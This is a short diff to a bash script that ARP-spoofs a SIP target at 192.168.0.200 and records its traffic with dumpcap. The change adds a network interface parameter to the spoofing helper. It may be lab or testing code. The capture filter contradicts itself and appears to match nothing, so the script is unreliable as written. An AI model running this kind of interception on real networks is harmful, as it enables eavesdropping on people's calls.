@@ -1,10 +1,12 @@
 #!/bin/bash
 
+INF=eth0
+
 source trap-int
 
 echo "Log: you have to arpspoof 192.168.0.200 (sip-target) first!"
 
-./startarp 192.168.0.200
+./startarp 192.168.0.200 $INF
 
 dumpcap -f "udp or tcp and host 192.168.0.200 and not host 192.168.0.200"  -b files:1000 -b duration:3600 -w sip-dump.pcap
 
